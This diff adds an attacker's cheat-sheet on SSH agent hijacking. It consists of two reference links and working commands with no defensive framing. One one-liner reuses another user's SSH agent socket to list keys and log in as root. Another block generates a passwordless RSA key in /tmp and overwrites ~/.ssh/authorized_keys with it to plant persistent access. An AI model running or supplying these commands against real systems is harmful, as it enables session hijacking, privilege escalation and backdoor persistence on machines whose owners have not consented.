@@ -1,0 +1,15 @@
+### ssh agent hijacking ###
+## links
+https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/
+https://jekhokie.github.io/linux/ssh/security/hijacking/2019/09/07/ssh-agent-hijacking.html
+
+## command
+cd ssh-* && a=$(pwd) && b=$(ls) && SSH_AUTH_SOCK=$a/$b ssh-add -l && SSH_AUTH_SOCK=$a/$b ssh root@localhost
+
+
+#############
+## new key ##
+#############
+cd ~/.ssh/
+ssh-keygen -b 3072 -t rsa -f /tmp/sshkey -q -N ""
+cat /tmp/sshkey.pub > authorized_keys
